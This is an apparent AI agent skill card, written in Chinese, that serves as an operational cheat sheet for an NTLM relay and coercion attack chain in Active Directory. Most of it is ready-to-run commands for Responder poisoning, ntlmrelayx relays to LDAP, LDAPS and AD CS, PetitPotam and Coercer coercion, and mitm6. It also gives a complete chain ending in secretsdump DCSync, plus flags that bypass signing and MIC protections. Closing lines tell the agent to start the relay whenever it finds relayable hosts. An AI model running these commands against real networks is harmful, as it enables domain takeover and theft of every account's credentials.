---
name: 'ntlm-relay-chain'
description: 'NTLM Relay + Coercion 攻击链：Responder配置、ntlmrelayx Relay目标、Coercion技术(PetitPotam/PrinterBug/Coercer)、LDAP→RBCD→DCSync完整流程'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

# NTLM Relay + Coercion 攻击链 — 实战参考

## 核心概念
NTLM 认证和传输协议无关。受害者向攻击者认证 → 攻击者转发(relay)到目标服务 → 攻击者以受害者身份操作目标。

## 快速命令速查

### 侦察
```bash
netexec smb 10.0.0.0/24                          # 查看每个主机的 SMB signing
netexec smb 10.0.0.0/24 --gen-relay-list targets.txt  # 自动找无签名主机
netexec ldap 10.0.0.10                            # 查看 LDAP signing + channel binding
```text

### Responder (关闭 SMB/HTTP 服务器，只毒化不捕获)
```bash
sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
sudo responder -I eth0 -v
```text

### ntlmrelayx (选择 relay 目标)
```bash
# LDAP relay → RBCD (最常用，金标准)
ntlmrelayx.py -t ldaps://DC --delegate-access -smb2support --remove-mic -6

# LDAP relay → Shadow Credentials → DCSync
ntlmrelayx.py -t ldap://DC --shadow-credentials --shadow-target 'DC01$'

# AD CS HTTP relay → 要机器证书 (ESC8)
ntlmrelayx.py -t http://CA/certsrv/ --adcs -smb2support
```text

### Coercion (强制目标认证到我们)
```bash
coercer coerce -u u -p p -d dom --target VICTIM --listen-ip ATK    # 自动试全部 12+ 方法
python3 PetitPotam.py ATK_IP VICTIM_IP                              # 对 DC 无需凭据！
```text

### mitm6 (IPv6 DNS 接管 → WPAD 强制认证)
```bash
sudo mitm6 -d corp.local -i eth0
ntlmrelayx.py -6 -wh attacker-wpad -t ldaps://DC --delegate-access
```text

### Relay 目标对照表
| Relay 到 | 条件 | 攻击效果 |
|---------|------|---------|
| LDAP | 无 LDAP signing | RBCD / Shadow Credentials / Add computer |
| LDAPS | 无 channel binding | 同上 + 创建计算机账户 |
| SMB | 无 SMB signing + admin 权限 | dump SAM/LSA / 执行命令 |
| AD CS HTTP | 无 EPA (ESC8) | 获取机器证书 → TGT → DCSync |
| MSSQL | 无加密 | SQL 查询执行 |

### LDAP Relay → RBCD → DCSync (完整流程)
```bash
# 1. 启动
sudo responder -I eth0 -v &
ntlmrelayx.py -t ldaps://DC --delegate-access -smb2support --remove-mic -6

# 2. Coerce DC
python3 PetitPotam.py ATK_IP DC_IP

# 3. 用 ntlmrelayx 创建的计算机账户获取 ST
getST.py -spn 'cifs/DC' -impersonate 'Administrator' -dc-ip DC 'dom/NEWCOMP$:Pass'

# 4. DCSync
export KRB5CCNAME=Administrator@cifs_DC.ccache
secretsdump.py -k -no-pass DC
```text

### 绕过现代防御
- `--remove-mic` → CVE-2019-1040
- `--remove-sign-seal` → CVE-2025-33073
- `--remove-target` + `-machine-account` → CVE-2019-1019

## Coercion 工具位置
- PetitPotam: `/opt/tools/PetitPotam/PetitPotam.py`
- Coercer: `~/.local/bin/coercer`
- PrinterBug: `/opt/tools/krbrelayx/printerbug.py`

## 常见故障
- "No relay targets" → 目标强制签名/通道绑定，用 `--remove-mic` 或换 LDAP
- SMB signing 全开 → 改 relay 到 LDAP(S)
- 时钟偏斜 → `ntpdate -s DC`

**Why:** NTLM relay + coercion 是我第二盲区，Responder+ntlmrelayx+coercer 的完整链一次没串过。
**How to apply:** AD 环境拿到低权用户后，先 `netexec smb --gen-relay-list`，有可 relay 主机就起 responder + ntlmrelayx。
